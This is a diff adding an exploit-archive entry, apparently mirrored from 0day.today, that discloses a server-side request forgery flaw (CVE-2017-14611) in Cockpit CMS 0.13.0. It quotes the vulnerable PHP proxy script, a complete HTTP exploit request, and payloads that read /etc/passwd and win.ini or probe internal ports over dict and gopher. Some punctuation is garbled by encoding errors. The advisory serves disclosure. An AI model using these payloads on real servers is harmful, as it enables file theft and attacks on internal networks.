@@ -1,0 +1,105 @@
+id: 30135
+date: 04/07/2018
+title: Cockpit CMS 0.13.0 Server Side Request Forgery Vulnerability
+author: Jiawang Zhang
+cves: CVE-2017-14611
+
+# SSRFPS"Server Side Request ForgeryPS(c) in Cockpit CMS 0.13.0 (CVE-2017-14611)
+
+The Cockpit CMS is awesome if you need a flexible content structure but don't want to be limited in how to use the content.
+
+## Product Download: https://getcockpit.com/
+
+## Vulnerability TypePSoSSRFPS"Server Side Request ForgeryPS(c)
+
+## Attack Type : Remote
+
+## Vulnerability Description
+
+Cockpit CMS uses a `fetch_url_contents` PS"https://github.com/aheinze/fetch_url_contentsPS(c)project code on github website, This Project has SSRF VulnerabilityPS!So affect the system.
+
+The vulnerability codePS"/assets/lib/fuc.js.phpPS(c):
+
+    if (isset($_REQUEST['url'])) {
+
+        // allow only query from same host
+        echo(parse_url($_SERVER['HTTP_REFERER'],PHP_URL_HOST));
+    
+        if ($_SERVER['HTTP_HOST'] != parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST)) {
+            header('HTTP/1.0 401 Unauthorized');
+            return;
+        }
+    
+        $url     = $_REQUEST['url'];
+        $content = '';
+    
+        if (function_exists('curl_exec')){
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
+            curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.52 Safari/537.17');
+            curl_setopt($conn, CURLOPT_AUTOREFERER, true);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_VERBOSE, 0);
+            $content = curl_exec($conn);
+            curl_close($conn);
+        }
+        if (!$content && function_exists('file_get_contents')){
+            $content = @file_get_contents($url);
+        }
+        if (!$content && function_exists('fopen') && function_exists('stream_get_contents')){
+            $handle  = @fopen ($url, "r");
+            $content = @stream_get_contents($handle);
+        }
+    
+        if (!$content) {
+            header('HTTP/1.0 503 Service Unavailable');
+        }
+    
+        return print($content);
+    }
+
+
+## Exploit
+
+    GET /assets/lib/fuc.js.php?url=dict://127.0.0.1:3306 HTTP/1.1
+    Host: 127.0.0.1
+    Connection: close
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8
+    referer:http://127.0.0.1/index.php
+
+modify the above url parameterPS!examplePS!file:
+
+request http(s) protocol: url=http(s)://www.google.com
+
+file readPSourl=file:///etc/passwd or url=file:///c:/windows/win.ini
+
+If the curl function is available,then use gopher!C/tftp!C/http!C/https!C/dict!C/ldap!C/file!C/imap!C/pop3!C/smtp!C/telnet protocols methodPS!if not then only use http!C/https!C/ftp protocol
+
+scan prot,example: url=dict://127.0.0.1:3306 
+use gopher protocol: url=gopher://127.0.0.1:3306 
+
+If the curl function is unavailable,this vulnerability trigger need allow\_url\_fopen option is enable in php.iniPS!allow\_url\_fopen option defualt is enable.
+
+## Versions
+
+Cockpit 0.13.0
+
+## Impact
+
+SSRF(Server Side Request Forgery) in Cockpit 0.13.0 version allow remote attackers to arbitrary files readPS!scan network portPS!information detection,internal network server attack.
+
+## Credit
+
+This vulnerability was discovered by Qian Wu & Bo Wang & Jiawang Zhang &  National Computer Network Emergency Response Technical Team/Coordination Center of China (CNCERT/CC)
+
+## References
+
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14611
+
+#  0day.today [2023-03-26]  #
